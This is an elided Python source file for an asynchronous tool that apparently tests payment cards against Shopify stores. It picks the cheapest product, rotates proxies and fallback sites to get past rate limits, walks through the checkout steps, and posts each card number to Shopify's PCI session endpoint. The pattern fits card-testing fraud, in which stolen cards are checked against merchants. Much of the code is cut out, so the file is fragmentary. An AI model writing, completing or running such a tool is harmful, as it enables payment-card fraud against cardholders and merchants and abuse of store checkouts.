...
_site_429_cache = {}
_site_429_cache_lock = asyncio.Lock()
...
class AioHTTPClient:
    def __init__(self, timeout=12, proxy_url=None, headers=None):
    ...
    async def __aenter__(self):
        ...
        if self.proxy_url:
            self._session._proxy = self.proxy_url
        return self
...
async def find_cheapest_product(client: AioHTTPClient, shop_url: str, min_price: float = 0.50, fallback_sites: List[str] = None) -> Tuple[str, str, str, str]:
    now = time.time()
    
    async with _site_429_cache_lock:
                ...
                if fallback_sites:
                    ...
                    for alt_site in fallback_sites[:5]:
                        if alt_site != shop_url:
                            try:
                                return await find_cheapest_product(client, alt_site, min_price, None)
                            except:
                                continue
    ...
    try:
        result = await _find_product_from_sources(client, shop_url, min_price)
        if result:
            async with _product_cache_lock:
...
async def _find_product_from_sources(client: AioHTTPClient, shop_url: str, min_price: float = 0.50):
    try:
    ...
    try:
        result = await _find_product_from_homepage(client, shop_url, min_price)
        if result:
            return result
    except Exception as e:
        if "429" in str(e):
...
async def _find_product_from_homepage(client: AioHTTPClient, shop_url: str, min_price: float = 0.50):
    try:
...
async def _find_product_from_collections(client: AioHTTPClient, shop_url: str, min_price: float = 0.50):
    try:
...
async def _find_product_from_search(client: AioHTTPClient, shop_url: str, min_price: float = 0.50):
    try:
...
async def _find_product_from_products_json(client: AioHTTPClient, shop_url: str, min_price: float = 0.50):
    async with _site_429_cache_lock:
        if shop_url in _site_429_cache:
    ...
    if resp.status == 429:
        async with _site_429_cache_lock:
            _site_429_cache[shop_url] = time.time()
        raise Exception("GET products.json returned 429")
    
    if resp.status != 200:
        raise Exception(f"GET products.json returned {resp.status}")
...
async def add_to_cart_and_checkout(client: AioHTTPClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    ...
    if checkout_resp.status not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status}")

    checkout_url = str(checkout_resp.url)
    checkout_html = await checkout_resp.text()
...
async def fetch_private_access_token(client: AioHTTPClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
...
async def fetch_actions_js(client: AioHTTPClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
    ...
    if resp.status != 200:
        raise Exception(f"GET actions JS returned {resp.status}")
...
async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
    ...
    async with ClientSession(connector=connector, timeout=timeout) as session:
        ...
        resp = await session.post("https://checkout.pci.shopifyinc.com/sessions", data=payload, headers=headers)
...
async def send_proposal(client: AioHTTPClient, shop_url: str, checkout_url: str, checkout_token: str,
  ...
  "id": "{proposal_id}"
    ...
    if resp.status == 429:
        raise Exception("returned 429")
    if resp.status >= 500:
        raise Exception(f"returned {resp.status}")
    return resp.status, await resp.text()

# ──────────────────────── Step 5: Proposal 2 (email) ─────────────────

async def send_proposal2(client: AioHTTPClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, stable_id: str, variant_id: str, price: str,
...
async def send_proposal3(client: AioHTTPClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, stable_id: str, variant_id: str, price: str,
                          proposal_id: str, build_id: str, source_token: str, queue_token: str,
...
async def send_poll_for_receipt(client: AioHTTPClient, shop_url: str, checkout_url: str, checkout_token: str,
                                 session_token: str, build_id: str, source_token: str,
...
async def send_submit_for_completion(client: AioHTTPClient, shop_url: str, checkout_url: str, checkout_token: str,
                                      session_token: str, stable_id: str, variant_id: str, price: str,
...
async def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    if not shop_url:
    ...
    client = AioHTTPClient(timeout=12, proxy_url=proxy_url, headers=headers)
    ...
    try:
        ...
        try:
            checkout_url, checkout_token, session_token, checkout_html = await add_to_cart_and_checkout(client, shop_url, variant_id)
        ...
        try:
            _, proposal_body = await send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
        ...
        try:
            _, proposal2_body = await send_proposal2(client, shop_url, checkout_url, checkout_token, session_token,
                                                     stable_id, variant_id, price, proposal_id, build_id, source_token,
        ...
        try:
            ...
            for attempt in range(1 + len(fallback_addrs)):
                _, p3_body = await send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                  stable_id, variant_id, price, proposal_id, build_id, source_token,
                ...
                if not signed_check:
                    ...
                    _, p3_body2 = await send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                       stable_id, variant_id, price, proposal_id, build_id, source_token,
        ...
        try:
            ...
            pci_status, pci_body = await send_pci_session(ident_sig, card_number, f"{addr.first_name} {addr.last_name}",
